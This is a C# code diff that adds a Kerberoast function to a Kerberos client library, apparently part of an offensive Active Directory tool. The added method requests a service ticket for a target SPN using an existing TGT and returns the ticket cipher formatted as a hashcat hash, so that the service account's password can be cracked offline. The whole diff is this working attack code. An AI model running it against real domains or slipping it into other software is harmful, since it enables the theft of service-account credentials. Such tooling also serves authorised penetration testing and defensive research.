@@ -47,4 +47,26 @@ public static class KerberosClient
 
         return new Tgt(resp.Ticket, part.SessionKeyEtype, part.SessionKey, part.EndTime, realm, user, $"krbtgt/{realm}");
     }
+
+    /// <summary>
+    /// Requests a service ticket for <paramref name="spn"/> using <paramref name="tgt"/> and returns
+    /// the Kerberoast hash string (<paramref name="account"/> is the owning account's name, used only
+    /// to label the hash). Throws with the KDC error on failure.
+    /// </summary>
+    public static string Kerberoast(string kdcHost, Tgt tgt, string spn, string account, int port = 88)
+    {
+        DateTimeOffset now = DateTimeOffset.UtcNow;
+        DateTimeOffset till = now.AddDays(1);
+        uint nonce = (uint)RandomNumberGenerator.GetInt32(int.MaxValue);
+        byte[] confounder = RandomNumberGenerator.GetBytes(8);
+
+        byte[] req = TgsReq.Build(tgt, spn, nonce, till, now, now.Microsecond, confounder);
+        TgsRep rep = TgsRep.Parse(KerberosTcpClient.SendReceive(kdcHost, req, port));
+        if (!rep.IsTgsRep)
+        {
+            throw new InvalidOperationException($"TGS exchange failed for {spn}: {Krb5Constants.DescribeError(rep.ErrorCode)}");
+        }
+
+        return KerbTgsRoast.Hashcat(rep.TicketEtype, account, tgt.Realm, spn, rep.TicketCipher);
+    }
 }
